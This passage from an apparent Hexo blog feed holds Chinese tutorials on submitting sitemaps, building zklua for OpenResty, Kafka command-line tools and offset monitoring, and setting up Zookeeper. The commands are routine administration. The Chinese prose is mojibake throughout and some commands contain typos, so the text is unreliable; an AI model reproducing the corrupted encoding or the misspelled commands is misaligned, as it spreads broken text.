class="name">lastmod</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">loc</span>&gt;</span>https://kekek.cc/2017/03/23/bitwise-permission/<span class="tag">&lt;/<span class="name">loc</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">lastmod</span>&gt;</span>2018-05-03T12:53:55.729Z<span class="tag">&lt;/<span class="name">lastmod</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">urlset</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Google"><a href="#Google" class="headerlink" title="Google"></a>Google</h3><p>è®¿é—®<a href="https://www.google.com/webmasters/tools/home?hl=zh-CN">https://www.google.com/webmasters/tools/home?hl=zh-CN</a>æ·»åŠ ç«™ç‚¹ã€‚</p><p><img src="/images/WX20180504-191101@2x.png"></p><h3 id="Baidu"><a href="#Baidu" class="headerlink" title="Baidu"></a>Baidu</h3><p>è®¿é—®<a href="https://ziyuan.baidu.com/linksubmit/index">https://ziyuan.baidu.com/linksubmit/index</a>æ·»åŠ ç«™ç‚¹ã€‚</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>openresty-zookeeper</title>
      <link href="/post/openresty-zookeeper.html"/>
      <url>/post/openresty-zookeeper.html</url>
      
        <content type="html"><![CDATA[<p>ç¼–è¯‘zookeeper </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">./configure</span><br><span class="line">make</span><br><span class="line">make install </span><br></pre></td></tr></table></figure><p><a href="https://github.com/forhappy/zklua.git">zklua</a></p><p>å¦‚æœluaæ˜¯openresyè‡ªå¸¦çš„ï¼Œéœ€è¦<code>export =/usr/loacal/openresty/luajit/</code>ã€‚ä¸‹è½½åç¼–è¯‘<code>make</code>ï¼Œç¼–è¯‘å‡ºé”™å¯ä»¥å°è¯•ä½¿ç”¨<a href="https://github.com/forhappy/zklua">https://github.com/forhappy/zklua</a>ã€‚</p><p>ldd zklua.so æŸ¥çœ‹å¼•ç”¨æœ‰æ²¡æœ‰ç¼ºå¤±çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ ldd zklua.so</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffcecf7a000)</span><br><span class="line">librt.so.1 =&gt; /lib64/librt.so.1 (0x00007fb2597ff000)</span><br><span class="line">libm.so.6 =&gt; /lib64/libm.so.6 (0x00007fb25957b000)</span><br><span class="line">libdl.so.2 =&gt; /lib64/libdl.so.2 (0x00007fb259376000)</span><br><span class="line">libpthread.so.0 =&gt; /lib64/libpthread.so.0 (0x00007fb259159000)</span><br><span class="line">libzookeeper_mt.so.2 =&gt; /lib64/libzookeeper_mt.so.2 (0x00007fb258f3f000)</span><br><span class="line">libc.so.6 =&gt; /lib64/libc.so.6 (0x00007fb258baa000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x00007fb259c17000)</span><br></pre></td></tr></table></figure><p>å¦‚æœ<code>libzookeeper_mt.so.2</code>ç¼ºå¤±ï¼Œå°†<code>/usr/local/lib/libzookeeper_mt.so.2</code>é“¾æ¥åˆ°<code>/lib64/libzookeeper_mt.so.2</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ln -s /usr/local/lib/libzookeeper_mt.so.2 /lib64/libzookeeper_mt.so.2</span><br></pre></td></tr></table></figure><p><a href="http://san-yun.iteye.com/blog/1973552">http://san-yun.iteye.com/blog/1973552</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kafka å¿«é€Ÿå¼€å§‹</title>
      <link href="/post/kafka.html"/>
      <url>/post/kafka.html</url>
      
        <content type="html"><![CDATA[<h3 id="å®‰è£…ä¸é…ç½®"><a href="#å®‰è£…ä¸é…ç½®" class="headerlink" title="å®‰è£…ä¸é…ç½®"></a>å®‰è£…ä¸é…ç½®</h3><p>ä»<a href="http://kafka.apache.org/">å®˜ç½‘</a>ä¸‹è½½æœ€æ–°çš„äºŒè¿›åˆ¶åŒ…ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirror.bit.edu.cn/apache/kafka/0.10.2.0/kafka_2.10-0.10.2.0.tgz</span><br></pre></td></tr></table></figure><p>è§£å‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf kafka_2.10-0.10.2.0.tgz -C /usr/local</span><br></pre></td></tr></table></figure><blockquote><p>Kafka ä¾èµ– Zookeeperï¼Œé¦–å…ˆè¦å®‰è£… Zookeeperã€‚ä½¿ç”¨è¯´æ˜å‚è€ƒ<a href="/2017/04/28/zookeeper/">Zookeeperå¿«é€Ÿå¼€å§‹</a></p></blockquote><p><a href="https://cwiki.apache.org/confluence/display/KAFKA/Kafka+data+structures+in+Zookeeper">Kafka æ•°æ®åœ¨ Zookeeper ä¸­çš„å­˜å‚¨ç»“æ„</a></p><p>æ–°æ—§ç‰ˆæœ¬çš„å­˜å‚¨ç»“æ„ä¸åŒï¼Œä¸»è¦åœ¨äº Consumer offset çš„ä¿å­˜ï¼Œæ—§ç‰ˆä¿å­˜åœ¨ Zookeeper ä¸­ï¼Œæ–°ç‰ˆä¿å­˜åœ¨ kafka ä¸­ã€‚</p><p>0.8 ç­‰æ—©æœŸç‰ˆæœ¬åœ¨ Zookeeper ä¸­çš„å­˜å‚¨ç»“æ„<br><img src="/images/hW6hL.png"></p><h3 id="åè¯è§£é‡Š"><a href="#åè¯è§£é‡Š" class="headerlink" title="åè¯è§£é‡Š"></a>åè¯è§£é‡Š</h3><ul><li><p>Broker<br>  Kafkaé›†ç¾¤åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªæœåŠ¡å™¨ï¼Œè¿™ç§æœåŠ¡å™¨è¢«ç§°ä¸ºbroker</p></li><li><p>Topic<br>  æ¯æ¡å‘å¸ƒåˆ° Kafka é›†ç¾¤çš„æ¶ˆæ¯éƒ½æœ‰ä¸€ä¸ªç±»åˆ«ï¼Œè¿™ä¸ªç±»åˆ«è¢«ç§°ä¸º Topic ã€‚ï¼ˆç‰©ç†ä¸Šä¸åŒ Topic çš„æ¶ˆæ¯åˆ†å¼€å­˜å‚¨ï¼Œé€»è¾‘ä¸Šä¸€ä¸ªtopicçš„æ¶ˆæ¯è™½ç„¶ä¿å­˜äºä¸€ä¸ªæˆ–å¤šä¸ªbrokerä¸Šä½†ç”¨æˆ·åªéœ€æŒ‡å®šæ¶ˆæ¯çš„ Topic å³å¯ç”Ÿäº§æˆ–æ¶ˆè´¹æ•°æ®è€Œä¸å¿…å…³å¿ƒæ•°æ®å­˜äºä½•å¤„ï¼‰</p></li><li><p>Partition<br>  Partition æ˜¯ç‰©ç†ä¸Šçš„æ¦‚å¿µï¼Œæ¯ä¸ª Topic åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ª Partition ï¼Œåˆ›å»º Topic æ—¶å¯æŒ‡å®š Partition æ•°é‡ã€‚æ¯ä¸ª Partition å¯¹åº”äºä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œè¯¥æ–‡ä»¶å¤¹ä¸‹å­˜å‚¨è¯¥ Partition çš„æ•°æ®å’Œç´¢å¼•æ–‡ä»¶</p></li><li><p>Producer<br>  è´Ÿè´£å‘å¸ƒæ¶ˆæ¯åˆ°Kafka broker</p></li><li><p>Consumer<br>  æ¶ˆè´¹æ¶ˆæ¯ã€‚æ¯ä¸ª Consumer å±äºä¸€ä¸ªç‰¹å®šçš„ Consumer groupï¼ˆå¯ä¸ºæ¯ä¸ª Consumer æŒ‡å®š group nameï¼Œè‹¥ä¸æŒ‡å®š group name åˆ™å±äºé»˜è®¤çš„ group ï¼‰ã€‚ä½¿ç”¨ consumer high level API æ—¶ï¼ŒåŒä¸€ Topic çš„ä¸€æ¡æ¶ˆæ¯åªèƒ½è¢«åŒä¸€ä¸ª consumer group å†…çš„ä¸€ä¸ª consumer æ¶ˆè´¹ï¼Œä½†å¤šä¸ª consumer group å¯åŒæ—¶æ¶ˆè´¹è¿™ä¸€æ¶ˆæ¯ã€‚</p></li></ul><h3 id="ç›‘æ§"><a href="#ç›‘æ§" class="headerlink" title="ç›‘æ§"></a>ç›‘æ§</h3><h4 id="KafkaOffsetMonitor"><a href="#KafkaOffsetMonitor" class="headerlink" title="KafkaOffsetMonitor"></a>KafkaOffsetMonitor</h4><blockquote><p>GitHub é¡¹ç›®ä¸»é¡µ README ç¤ºä¾‹æœ‰é”™è¯¯ã€‚æœ€æ–°ç‰ˆæœªå‘å¸ƒreleaseï¼Œéœ€è¦è‡ªå·±ä¸‹è½½æºç ç¼–è¯‘ã€‚</p></blockquote><ol><li><p>ä¸‹è½½ç¼–è¯‘</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git ccone https://github.com/quantifind/KafkaOffsetMonitor.git</span><br><span class="line">cd KafkaOffsetMonitor</span><br><span class="line">sbt assembly</span><br></pre></td></tr></table></figure><blockquote><p>brew install sbt<br>ç¼–è¯‘å®Œåœ¨targetç›®å½•ä¸­</p></blockquote></li><li><p>è¿è¡Œ</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">java -cp KafkaOffsetMonitor-assembly-0.3.0-SNAPSHOT.jar \</span><br><span class="line">    com.quantifind.kafka.offsetapp.OffsetGetterWeb \</span><br><span class="line">    --offsetStorage kafka \</span><br><span class="line">    --zk 127.0.0.1:2181 \</span><br><span class="line">    --port 8989 \</span><br><span class="line">    --refresh 10.seconds \</span><br><span class="line">    --retain 2.days</span><br></pre></td></tr></table></figure><ul><li><p>offsetStorage offset å­˜å‚¨çš„ä½ç½®ï¼Œæ”¯æŒ zookeeperã€kafkaã€stormã€‚ä» kafka 0.10.x é»˜è®¤åç§»é‡å»ºè®®å­˜å‚¨åˆ° kafka ä¸­ã€‚consumer ä»¥ <code>zookeeper.connect</code> æ–¹å¼è¿æ¥åˆ° kafka çš„ offset å­˜å‚¨åœ¨ zookeeper ä¸­ï¼Œä»¥ <code>bootstrap.servers</code> æ–¹å¼è¿æ¥åˆ° kafka çš„ offset å­˜å‚¨åœ¨ kafka <code>__consumer_offsets</code> topic ä¸­ã€‚</p></li><li><p>zk kafka è¿æ¥çš„ zookeeper åœ°å€ ï¼ˆæ— è®ºä½¿ç”¨å“ªä¸€ç§ç±»å‹çš„ offsetStorage ï¼Œè¿™é‡Œéƒ½æ˜¯ zookeeper çš„åœ°å€ã€‚</p></li><li><p>offsetStorage valid options are â€˜â€™zookeeperâ€™â€™, â€˜â€™kafkaâ€™â€™ or â€˜â€™stormâ€™â€™. Anything else falls back to â€˜â€™zookeeperâ€™â€™</p></li><li><p>zk the ZooKeeper hosts</p></li><li><p>port on what port will the app be available</p></li><li><p>refresh how often should the app refresh and store a point in the DB</p></li><li><p>retain how long should points be kept in the DB</p></li><li><p>dbName where to store the history (default â€˜offsetappâ€™)</p></li><li><p>kafkaOffsetForceFromStart only applies to â€˜â€™kafkaâ€™â€™ format. Force KafkaOffsetMonitor to scan the commit messages from start (see notes below)</p></li><li><p>stormZKOffsetBase only applies to â€˜â€™stormâ€™â€™ format. Change the offset storage base in zookeeper, default to â€˜â€™&#x2F;stormconsumersâ€™â€™ (see notes below)</p></li><li><p>pluginsArgs additional arguments used by extensions (see below)</p></li></ul></li></ol><blockquote><p>ç›‘æ§å›¾è¡¨å‚æ•°è¯´æ˜</p></blockquote><ul><li>Topicï¼šåˆ›å»ºTopicåç§°</li><li>Partitionï¼šåˆ†åŒºç¼–å·</li><li>Offsetï¼šè¡¨ç¤ºè¯¥Paritionå·²ç»æ¶ˆè´¹äº†å¤šå°‘Message</li><li>LogSizeï¼šè¡¨ç¤ºè¯¥Partitionç”Ÿäº§äº†å¤šå°‘Message</li><li>Lagï¼šè¡¨ç¤ºæœ‰å¤šå°‘æ¡Messageæœªè¢«æ¶ˆè´¹</li><li>Ownerï¼šè¡¨ç¤ºæ¶ˆè´¹è€…</li><li>Createdï¼šè¡¨ç¤ºè¯¥Partitionåˆ›å»ºæ—¶é—´</li><li>Last Seenï¼šè¡¨ç¤ºæ¶ˆè´¹çŠ¶æ€åˆ·æ–°æœ€æ–°æ—¶é—´</li></ul><p>æ­£å¸¸çš„æƒ…å†µä¸‹ LogSize &#x3D; Offset + Lagã€‚LogSize å’Œ Offset çº¿é‡åˆè¡¨ç¤ºæ¶ˆè´¹å®Œæ¯•ã€‚Lag æ–œç‡æŒç»­æ¯” Offset å¤§ï¼Œéœ€è¦æ­¤æ—¶åº”è¯¥è€ƒè™‘æ·»åŠ  consumer ã€‚</p><h3 id="Kafka-å‘½ä»¤è¡Œå·¥å…·"><a href="#Kafka-å‘½ä»¤è¡Œå·¥å…·" class="headerlink" title="Kafka å‘½ä»¤è¡Œå·¥å…·"></a>Kafka å‘½ä»¤è¡Œå·¥å…·</h3><h4 id="Topic-ç›¸å…³"><a href="#Topic-ç›¸å…³" class="headerlink" title="Topic ç›¸å…³"></a>Topic ç›¸å…³</h4><ol><li><p>åˆ›å»º Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --create --zookeeper zk01.example.com:2181 --replication-factor 1 --partitions 3 --topic your_topic_name</span><br></pre></td></tr></table></figure><ul><li>replication-factor å‰¯æœ¬æ•°é‡</li><li>partitions Partition æ•°é‡</li></ul></li><li><p>åˆ—å‡ºæ‰€æœ‰çš„ Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --zookeeper zk01.example.com:2181 --list</span><br></pre></td></tr></table></figure></li><li><p>åˆ é™¤ Topic</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-topics.sh --delete --zookeeper zk01.example.com:2181 --topic your_topic_name</span><br></pre></td></tr></table></figure><blockquote><p>éœ€è¦åœ¨ <code>server.properties</code> ä¸­è®¾ç½® <code>delete.topic.enable=true</code><br>å¦å¤–éœ€è¦æ³¨æ„ï¼šå¦‚æœå½“å‰ Topic æ²¡æœ‰ä¼ è¾“è¿‡ä¿¡æ¯æ˜¯å½»åº•åˆ é™¤ã€‚å¦‚æœå·²ç»ä¼ è¾“è¿‡æ•°æ®ï¼Œåªæ˜¯å°†æ­¤ Topic æ ‡è®°ä¸ºåˆ é™¤ã€‚</p></blockquote></li></ol><h4 id="Producer-ç›¸å…³"><a href="#Producer-ç›¸å…³" class="headerlink" title="Producer ç›¸å…³"></a>Producer ç›¸å…³</h4><ol><li>ç”Ÿäº§æ¶ˆæ¯ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list broker1:9092 --topic your_topic_name</span><br></pre></td></tr></table></figure> æˆ–è€…ç›´æ¥ä»æ–‡ä»¶ä¸­è¯» <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-producer.sh --broker-list broker1:9092 --topic streams-file-input &lt; file-input.txt</span><br></pre></td></tr></table></figure><blockquote><p>é€šè¿‡ <code>--producer.config</code> å‚æ•°æŒ‡å®š Producer é…ç½®æ–‡ä»¶ã€‚<a href="https://kafka.apache.org/documentation/#producerconfigs">é…ç½®å‚è€ƒ</a></p></blockquote></li></ol><h4 id="Consumer-ç›¸å…³"><a href="#Consumer-ç›¸å…³" class="headerlink" title="Consumer ç›¸å…³"></a>Consumer ç›¸å…³</h4><ol><li><p>æ¶ˆè´¹æ¶ˆæ¯</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-console-consumer.sh  --bootstrap-server broker1:9092 --topic your_topic_name --from-beginning</span><br></pre></td></tr></table></figure><ul><li>â€“from-beginning è®¾ç½®æ¶ˆè´¹è€…åç½®ä½ä¸ºæœ€å¼€å§‹ï¼ˆé»˜è®¤ä¸ºæœ«å°¾ï¼‰ã€‚</li></ul><blockquote><p>Consumer å…¶å®ƒé…ç½®ä¿¡æ¯å¯ä»¥é€šè¿‡ <code>--consumer-property</code> å‚æ•°é…ç½®ï¼Œæˆ–è€…ä½¿ç”¨ <code>--consumer.config</code> æŒ‡å®šé…ç½®æ–‡ä»¶è·¯å¾„ã€‚e.g. <code>--consumer-property group.id=print</code> <a href="https://kafka.apache.org/documentation/#consumerconfigs">é…ç½®å‚æ•°</a></p></blockquote></li></ol><h4 id="Consumer-Group"><a href="#Consumer-Group" class="headerlink" title="Consumer Group"></a>Consumer Group</h4><ol><li><p>åˆ—å‡ºæ‰€æœ‰çš„ Consumer Group</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --list</span><br></pre></td></tr></table></figure></li><li><p>åˆ—å‡ºæ¥æ¶ˆè´¹è€…çš„ offset</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --describe --group test-consumer-group</span><br></pre></td></tr></table></figure><blockquote><p>è¿™é‡Œåªæ˜¾ç¤ºå®¢æˆ·ç«¯ç›´æ¥é“¾æ¥åˆ° Kafka é›†ç¾¤ä¸Šé¢çš„æ¶ˆè´¹è€…ä¿¡æ¯ï¼Œé€šè¿‡ zookeeper è¿æ¥çš„éœ€è¦ä½¿ç”¨ <code>--zookeeper</code> å‚æ•°æ¥ä»£æ›¿ <code>--bootstrap-server</code>ã€‚</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">TOPIC      PARTITION  CURRENT-OFFSET  LOG-END-OFFSET  LAG      CONSUMER-ID     HOST     CLIENT-ID</span><br><span class="line">tp         1          38192           38192           0        -               -        -</span><br><span class="line">tp         0          37775           37775           0        -               -        -</span><br><span class="line">tp         2          37927           37927           0        -               -        -</span><br></pre></td></tr></table></figure><p> CURRENT-OFFSETï¼šå½“å‰æ¶ˆè´¹åˆ°çš„ä½ç½®<br> LOG-END-OFFSETï¼šé˜Ÿåˆ—æœ€åçš„ä½ç½®<br> LAGï¼šæœªè¢«æ¶ˆè´¹çš„ä¸ªæ•°</p></blockquote></li><li><p>åˆ é™¤ Consumer Group</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bin/kafka-consumer-groups.sh --bootstrap-server broker1:9092 --delete --group &lt;group-name&gt;</span><br></pre></td></tr></table></figure></li></ol><h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p><a href="https://kafka.apache.org/documentation/">ã€1ã€‘</a><a href="https://mos.meituan.com/library/32/how-to-install-kafka-on-centos7/">ã€2ã€‘</a> <a href="http://blog.csdn.net/suifeng3051/article/details/38321043">ã€3ã€‘</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Vim å…¥é—¨</title>
      <link href="/post/vim.html"/>
      <url>/post/vim.html</url>
      
        <content type="html"><![CDATA[<h3 id="å¸¸ç”¨å‘½ä»¤"><a href="#å¸¸ç”¨å‘½ä»¤" class="headerlink" title="å¸¸ç”¨å‘½ä»¤"></a>å¸¸ç”¨å‘½ä»¤</h3><ol><li>æ¸…é™¤æœç´¢é«˜äº® <code>:noh</code></li></ol>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Zookeeper å¿«é€Ÿå¼€å§‹</title>
      <link href="/post/zookeeper.html"/>
      <url>/post/zookeeper.html</url>
      
        <content type="html"><![CDATA[<h3 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h3><p>Zookeeper æ˜¯Apacheè½¯ä»¶åŸºé‡‘ä¼šçš„ä¸€ä¸ªè½¯ä»¶é¡¹ç›®ï¼Œå®ƒä¸»è¦æ˜¯ç”¨æ¥è§£å†³åˆ†å¸ƒå¼åº”ç”¨ä¸­ç»å¸¸é‡åˆ°çš„ä¸€äº›æ•°æ®ç®¡ç†é—®é¢˜ï¼Œå¦‚ï¼šç»Ÿä¸€å‘½åæœåŠ¡ã€çŠ¶æ€åŒæ­¥æœåŠ¡ã€é›†ç¾¤ç®¡ç†ã€åˆ†å¸ƒå¼åº”ç”¨é…ç½®é¡¹çš„ç®¡ç†ç­‰ã€‚</p><h3 id="å®‰è£…ä¸é…ç½®"><a href="#å®‰è£…ä¸é…ç½®" class="headerlink" title="å®‰è£…ä¸é…ç½®"></a>å®‰è£…ä¸é…ç½®</h3><p>Zookeeper æœ‰ä¸‰ç§ä¸åŒçš„è¿è¡Œç¯å¢ƒï¼šå•æœºæ¨¡å¼ã€ä¼ªé›†ç¾¤æ¨¡å¼ã€é›†ç¾¤æ¨¡å¼ã€‚åœ¨æµ‹è¯•ç¯å¢ƒä¸­èµ„æºæœ‰é™æˆ‘ä»¬å¸¸å¸¸ä½¿ç”¨å•æœºæ¨¡å¼æˆ–è€…ä¼ªé›†ç¾¤æ¨¡å¼ï¼Œç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨é›†ç¾¤æ¨¡å¼ã€‚</p><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><ol><li><p>ä¸‹è½½<br> å» Zookeeper <a href="https://zookeeper.apache.org/">å®˜ç½‘</a> é€‰ç€åˆé€‚çš„ç‰ˆæœ¬ä¸‹è½½å³å¯ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://mirror.bit.edu.cn/apache/zookeeper/zookeeper-3.4.10/zookeeper-3.4.10.tar.gz</span><br></pre></td></tr></table></figure></li><li><p>è§£å‹å®‰è£…<br> ä¸‹è½½å®Œæˆç›´æ¥è§£å‹å°±è¡Œäº†</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf zookeeper-3.4.10.tar.gz -C /usr/local</span><br></pre></td></tr></table></figure></li><li><p>å¯åŠ¨ä¸åœæ­¢<br> åœ¨è§£å‹å®Œçš„ bin ç›®å½•ä¸‹ä¼šæœ‰ zkServer[.sh|.bat] è„šæœ¬æ–‡ä»¶ï¼Œè¿è¡Œè„šæœ¬æ–‡ä»¶æŒ‡å®šå‘½ä»¤å’Œé…ç½®æ–‡ä»¶å³å¯ã€‚</p> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># å¯åŠ¨</span></span><br><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># åœæ­¢</span></span><br><span class="line">./bin/zkServer.sh stop /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>å»ºç«‹è¿æ¥</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># è¿æ¥å•æœº</span><br><span class="line">./bin/zkCli.sh -server 127.0.0.1:2181</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># è¿æ¥é›†ç¾¤</span><br><span class="line">./bin/zkCli.sh -server 127.0.0.1:2181,127.0.0.1:2182,127.0.0.1:2183</span><br></pre></td></tr></table></figure></li></ol><h4 id="å•æœºæ¨¡å¼é…ç½®"><a href="#å•æœºæ¨¡å¼é…ç½®" class="headerlink" title="å•æœºæ¨¡å¼é…ç½®"></a>å•æœºæ¨¡å¼é…ç½®</h4><p>å•æœºæ¨¡å¼å°±æ˜¯åœ¨ä¸€å°æœºå™¨ä¸Šå¯åŠ¨ä¸€ä¸ª Zookeeper æœåŠ¡ã€‚    </p><ol><li><p>å¤åˆ¶é…ç½®æ–‡ä»¶</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp /usr/local/zookeeper/conf/zoo_sample.cfg /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li><li><p>ä¿®æ”¹é…ç½®<br> vim &#x2F;etc&#x2F;zookeeper&#x2F;zoo.cfg</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">dataDir=/data/zookeeper/data</span><br><span class="line">dataLogDir=/data/zookeeper/logs</span><br><span class="line">clientPort=2181</span><br><span class="line">tickTime=2000</span><br><span class="line">initLimit=5</span><br><span class="line">syncLimit=2</span><br></pre></td></tr></table></figure><blockquote><p>é…ç½®è¯´æ˜ï¼š<br>dataDirï¼šæ•°æ®ç›®å½•<br>dataLogDirï¼šæ—¥å¿—ç›®å½•<br>clientPortï¼šå®¢æˆ·ç«¯è¿æ¥ç«¯å£<br>tickTimeï¼šZookeeper æœåŠ¡å™¨ä¹‹é—´æˆ–å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ä¹‹é—´ç»´æŒå¿ƒè·³çš„æ—¶é—´é—´éš”ï¼Œä¹Ÿå°±æ˜¯æ¯ä¸ª tickTime æ—¶é—´å°±ä¼šå‘é€ä¸€ä¸ªå¿ƒè·³ã€‚<br>initLimitï¼šZookeeperçš„Leader æ¥å—å®¢æˆ·ç«¯ï¼ˆFollowerï¼‰åˆå§‹åŒ–è¿æ¥æ—¶æœ€é•¿èƒ½å¿å—å¤šå°‘ä¸ªå¿ƒè·³æ—¶é—´é—´éš”æ•°ã€‚å½“å·²ç»è¶…è¿‡ 5ä¸ªå¿ƒè·³çš„æ—¶é—´ï¼ˆä¹Ÿå°±æ˜¯tickTimeï¼‰é•¿åº¦å Zookeeper æœåŠ¡å™¨è¿˜æ²¡æœ‰æ”¶åˆ°å®¢æˆ·ç«¯çš„è¿”å›ä¿¡æ¯ï¼Œé‚£ä¹ˆè¡¨æ˜è¿™ä¸ªå®¢æˆ·ç«¯è¿æ¥å¤±è´¥ã€‚æ€»çš„æ—¶é—´é•¿åº¦å°±æ˜¯ 5<em>2000&#x3D;10 ç§’<br>syncLimitï¼šè¡¨ç¤º Leader ä¸ Follower ä¹‹é—´å‘é€æ¶ˆæ¯æ—¶è¯·æ±‚å’Œåº”ç­”æ—¶é—´é•¿åº¦ï¼Œæœ€é•¿ä¸èƒ½è¶…è¿‡å¤šå°‘ä¸ªtickTime çš„æ—¶é—´é•¿åº¦ï¼Œæ€»çš„æ—¶é—´é•¿åº¦å°±æ˜¯ 2</em>2000&#x3D;4 ç§’ã€‚    </p></blockquote></li><li><p>å¯åŠ¨æœåŠ¡</p> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./bin/zkServer.sh start /etc/zookeeper/zoo.cfg</span><br></pre></td></tr></table></figure></li></ol><h4 id="ä¼ªé›†ç¾¤æ¨¡å¼é…ç½®"><a href="#ä¼ªé›†ç¾¤æ¨¡å¼é…ç½®" class="headerlink" title="ä¼ªé›†ç¾¤æ¨¡å¼é…ç½®"></a>ä¼ªé›†ç¾¤æ¨¡å¼é…ç½®</h4><p>ä¼ªé›†ç¾¤æ¨¡å¼å°±æ˜¯åœ¨ä¸€å°æœºå™¨ä¸Šé¢å¯åŠ¨å¤šä¸ª Zookeeper æœåŠ¡ã€‚    